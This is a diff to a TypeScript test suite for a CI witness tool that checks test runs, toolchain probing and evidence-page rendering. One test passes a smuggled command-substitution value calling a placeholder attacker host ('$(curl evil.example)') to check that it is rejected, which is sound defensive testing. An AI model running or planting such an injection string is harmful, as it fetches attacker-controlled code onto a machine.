@@ -34,7 +34,13 @@ import {
 } from "./engine.ts";
 import { draftPullPayload } from "./github-pr.ts";
 import { packetChecks, packetDivergences } from "./ledger-check.ts";
-import { isTestPath, verifyWitnessLogs, witnessEvidence } from "./witness.ts";
+import {
+  commandTools,
+  isTestPath,
+  toolchainLabel,
+  verifyWitnessLogs,
+  witnessEvidence,
+} from "./witness.ts";
 import { DISCLOSURE, FOUNDRY_REPO_URL } from "./neighbor.ts";
 import { buildPacket, renderEvidencePage, renderPrBody } from "./packet.ts";
 import { evaluatePolicy } from "./policy.ts";
@@ -1638,13 +1644,16 @@ test("status does not claim a re-block that the held slot already prevented", ()
 
 function fakeRunner(script: Record<string, { exit: number; output: string }>) {
   const calls: string[] = [];
-  const runner = async (cmd: string, args: string[]) => {
+  /** Parallel to `calls`: the working directory each step was handed, so cwd is assertable too. */
+  const cwds: (string | undefined)[] = [];
+  const runner = async (cmd: string, args: string[], opts?: { cwd?: string }) => {
     const line = [cmd, ...args].join(" ");
     calls.push(line);
+    cwds.push(opts?.cwd);
     const hit = Object.entries(script).find(([prefix]) => line.includes(prefix));
     return hit ? hit[1] : { exit: 0, output: "" };
   };
-  return { runner, calls };
+  return { runner, calls, cwds };
 }
 
 test("host witness: green at head, red on revert, sha-bound logs", async () => {
@@ -1709,6 +1718,159 @@ test("witness refuses instead of degrading: e2b without a key, host outside Wave
   );
   assert.equal(hostWave1.ok, false);
   if (!hostWave1.ok) assert.match(hostWave1.error, /Wave 0/);
+});
+
+const WAVE0 = {
+  packetId: "pkt_ravidsrk_orca-fleet_71",
+  repoId: "ravidsrk/orca-fleet",
+  baseSha: BASE,
+  headSha: HEAD,
+  sandbox: "host" as const,
+  wave: 0 as const,
+};
+
+/** 60 lines ending in the way a too-old interpreter actually dies, so the tail has to be a tail. */
+function noisyRun(): string {
+  const lines = Array.from({ length: 59 }, (_, i) => `line-${i + 1}`);
+  lines.push("TypeError: unsupported operand type(s) for |: 'type' and 'NoneType'");
+  return lines.join("\n");
+}
+
+/**
+ * The two refusals an operator hits with a working patch and a broken machine (issue #41).
+ *
+ * Both used to end at the exit code. `tests are red at head d91fe2f (exit 1) — nothing to witness`
+ * is the same sentence whether the patch is wrong or the interpreter is six minor versions too
+ * old, and it never referenced `headRun.output` at all — so there was nothing to un-truncate, the
+ * output simply was not there. A refusal that cannot be told apart from a different refusal is not
+ * a diagnostic.
+ */
+test("a red-at-head refusal prints the command it ran and the tail of the run", async () => {
+  const redHead = await witnessEvidence(
+    { ...WAVE0, testCommand: "python3 scripts/validate.py" },
+    fakeRunner({ "run-tests@head": { exit: 1, output: noisyRun() } }).runner,
+    {},
+  );
+  assert.equal(redHead.ok, false);
+  if (!redHead.ok) {
+    assert.match(redHead.error, /red at head/i);
+    assert.match(redHead.error, /python3 scripts\/validate\.py/, "the resolved command is missing");
+    assert.match(
+      redHead.error,
+      /unsupported operand type\(s\)/,
+      `the failing output is missing: ${redHead.error}`,
+    );
+    // A tail, not a dump: 60 lines in, the first 20 stay out and the refusal says how many.
+    assert.doesNotMatch(redHead.error, /line-1\b/, "the whole run was pasted instead of its tail");
+    assert.match(redHead.error, /20 earlier lines omitted/, redHead.error);
+    assert.match(redHead.error, /line-59/, redHead.error);
+  }
+});
+
+test("a red-at-head refusal with no output at all says so, and points at the pre-flight", async () => {
+  // The shape of #41 on a stock macOS machine: `python3` resolves to 3.9.6, the command dies
+  // before it prints anything, and the operator gets three seconds and a blank refusal.
+  const silent = await witnessEvidence(
+    { ...WAVE0, testCommand: "python3 scripts/validate.py" },
+    fakeRunner({ "run-tests@head": { exit: 127, output: "" } }).runner,
+    {},
+  );
+  assert.equal(silent.ok, false);
+  if (!silent.ok) {
+    assert.match(silent.error, /python3 scripts\/validate\.py/);
+    assert.match(silent.error, /no output/i, silent.error);
+    // Pinned verbatim, the way INGEST_INVOCATION is: `page.includes(CONSTANT)` holds for whatever
+    // the constant happens to say, so the assertion has to know the right answer. `cli.test.ts`
+    // supplies the other half by driving that verb for real.
+    const { PREFLIGHT_INVOCATION } = await import("./witness.ts");
+    assert.equal(
+      PREFLIGHT_INVOCATION,
+      "node --experimental-strip-types factory/cli.ts witness-check",
+    );
+    assert.ok(silent.error.includes(PREFLIGHT_INVOCATION), silent.error);
+  }
+});
+
+test("a failed negative control prints the revert run's output and the command", async () => {
+  const stayedGreen = await witnessEvidence(
+    { ...WAVE0, testCommand: "npm test" },
+    fakeRunner({
+      "run-tests@head": { exit: 0, output: "ok" },
+      "run-tests@revert": { exit: 0, output: "100 passing, 0 failing" },
+    }).runner,
+    {},
+  );
+  assert.equal(stayedGreen.ok, false);
+  if (!stayedGreen.ok) {
+    assert.match(stayedGreen.error, /negative control/i);
+    assert.match(stayedGreen.error, /npm test/, stayedGreen.error);
+    assert.match(stayedGreen.error, /100 passing, 0 failing/, stayedGreen.error);
+  }
+});
+
+test("the witness records the toolchain that produced the green, resolved inside the clone", async () => {
+  const { runner, calls, cwds } = fakeRunner({
+    "probe command -v python3": { exit: 0, output: "/opt/homebrew/bin/python3\nPython 3.14.7\n" },
+    "run-tests@head": { exit: 0, output: "42 passing" },
+    "run-tests@revert": { exit: 1, output: "3 failing" },
+  });
+  const outcome = await witnessEvidence(
+    { ...WAVE0, testCommand: "python3 scripts/validate.py && python3 -m unittest discover" },
+    runner,
+    {},
+  );
+  assert.equal(outcome.ok, true);
+  if (outcome.ok) assert.equal(outcome.witness.toolchain, "python3 3.14.7");
+
+  // Resolved in the checkout, not in the operator's home: a repo that pins its interpreter
+  // (`.python-version`, `.tool-versions`, `.nvmrc`) must be recorded by what *it* selects.
+  const probeIdx = calls.findIndex((c) => c.startsWith("probe "));
+  assert.ok(probeIdx !== -1, calls.join("\n"));
+  assert.match(cwds[probeIdx] ?? "", /foundry-witness-/, `probed in ${cwds[probeIdx]}`);
+});
+
+test("a witness whose toolchain could not be resolved claims none", async () => {
+  // The alternative — recording `python3 (not found)` — puts a sentence on the evidence page that
+  // reads as a fact about the run. Absence is the honest record.
+  const { runner } = fakeRunner({
+    "run-tests@head": { exit: 0, output: "42 passing" },
+    "run-tests@revert": { exit: 1, output: "3 failing" },
+  });
+  const outcome = await witnessEvidence({ ...WAVE0, testCommand: "python3 -m pytest" }, runner, {});
+  assert.equal(outcome.ok, true);
+  if (outcome.ok) assert.equal(outcome.witness.toolchain, undefined);
+});
+
+test("the toolchain probe names one tool per command segment, and only plausible ones", () => {
+  assert.deepEqual(
+    commandTools("python3 scripts/validate.py && python3 -m unittest discover -s tests -v"),
+    ["python3"],
+  );
+  assert.deepEqual(commandTools("npm ci && npm test"), ["npm"]);
+  assert.deepEqual(commandTools("pytest -q | tee out.txt; ruff check ."), ["pytest", "tee", "ruff"]);
+  assert.deepEqual(commandTools("FOO=1 python3 -c 'x'"), ["python3"], "env assignments are not tools");
+  assert.deepEqual(commandTools("true"), ["true"]);
+  // The probe interpolates the token into a shell command, so anything that is not a bare command
+  // name is dropped rather than resolved. `testCommand` is already operator-controlled and run
+  // verbatim, so this is not a new trust boundary — it is a refusal to invent a second one.
+  assert.deepEqual(commandTools("$(curl evil.example) --run"), []);
+  assert.deepEqual(commandTools("./scripts/ci.sh && make -j4"), ["./scripts/ci.sh", "make"]);
+});
+
+test("the toolchain label states versions and stays silent about what it could not resolve", () => {
+  assert.equal(
+    toolchainLabel([{ tool: "python3", path: "/opt/homebrew/bin/python3", version: "3.14.7", raw: "Python 3.14.7" }]),
+    "python3 3.14.7",
+  );
+  assert.equal(
+    toolchainLabel([
+      { tool: "npm", path: "/x/npm", version: "10.9.2", raw: "10.9.2" },
+      { tool: "node", path: "/x/node", version: "24.11.0", raw: "v24.11.0" },
+    ]),
+    "npm 10.9.2, node 24.11.0",
+  );
+  assert.equal(toolchainLabel([{ tool: "python3" }]), "");
+  assert.equal(toolchainLabel([]), "");
 });
 
 test("draft-ready requires a witnessed manifest, not an attested one", () => {
@@ -2506,6 +2668,33 @@ test("a manifest may name only this packet's own log paths, and the parser settl
   assert.equal(witnessLogPathViolation(PKT, witnessLogPaths(PKT)), undefined);
 });
 
+test("an ingested manifest may carry a toolchain, and may not carry a junk one", async () => {
+  // Optional in both directions on purpose. Every witness produced before #41 has no `toolchain`
+  // and must still ingest; a witness that has one must not be able to smuggle a non-string into
+  // the ledger, where `renderEvidencePage` interpolates it into the maintainer's page.
+  const { parseWitnessManifest } = await import("./witness.ts");
+  const PKT = "pkt_github_awesome-copilot_2684";
+  const raw = (extra: Record<string, unknown>) =>
+    JSON.stringify({
+      ...boundWitness("e2b", "github/awesome-copilot", PKT, extra),
+      testCommand: "true",
+    });
+
+  const carried = parseWitnessManifest(raw({ toolchain: "python3 3.14.7" }), PKT);
+  assert.equal(carried.ok, true);
+  if (carried.ok) assert.equal(carried.manifest.witness.toolchain, "python3 3.14.7");
+
+  const absent = parseWitnessManifest(raw({}), PKT);
+  assert.equal(absent.ok, true);
+  if (absent.ok) assert.equal(absent.manifest.witness.toolchain, undefined);
+
+  for (const junk of [{ toolchain: 12 }, { toolchain: { node: "24" } }, { toolchain: "   " }]) {
+    const result = parseWitnessManifest(raw(junk), PKT);
+    assert.equal(result.ok, false, `${JSON.stringify(junk)} must be refused`);
+    if (!result.ok) assert.match(result.error, /toolchain/i);
+  }
+});
+
 test("the evidence page tells the maintainer where the hashed logs are", () => {
   const { state, id } = reviewingWave1();
   const packet = state.packets[0];
@@ -2530,6 +2719,32 @@ test("the evidence page tells the maintainer where the hashed logs are", () => {
   assert.ok(page.includes("https://github.com/ravidsrk/oss-foundry"), page);
   assert.match(page, /not yours/);
   assert.match(page, new RegExp(`shasum -a 256 docs/evidence/logs/${id}/test\\.log`));
+});
+
+test("the evidence page names the toolchain the green was produced by, when the witness knows it", () => {
+  // The fact issue #41 cost an operator three hours to establish by hand: *which* interpreter
+  // produced this exit 0. A maintainer reading the page has the same question and no shell on our
+  // machine, so a witness that resolved it prints it; one that did not says nothing rather than
+  // implying the question was asked.
+  const { state, id } = reviewingWave1();
+  const packet = state.packets[0];
+  const withTool = applyAttachEvidence(
+    state,
+    id,
+    manifestWith(boundWitness("e2b", packet.repoId, id, { toolchain: "python3 3.14.7" })),
+    bindingFor(packet),
+  );
+  assert.equal(withTool.error, undefined);
+  assert.match(renderEvidencePage(withTool.state.packets[0]), /python3 3\.14\.7/);
+
+  const without = applyAttachEvidence(
+    state,
+    id,
+    manifestWith(boundWitness("e2b", packet.repoId, id)),
+    bindingFor(packet),
+  );
+  assert.equal(without.error, undefined);
+  assert.doesNotMatch(renderEvidencePage(without.state.packets[0]), /toolchain/i);
 });
 
 test("a witness forged straight into the ledger is refused at the promotion gate", () => {
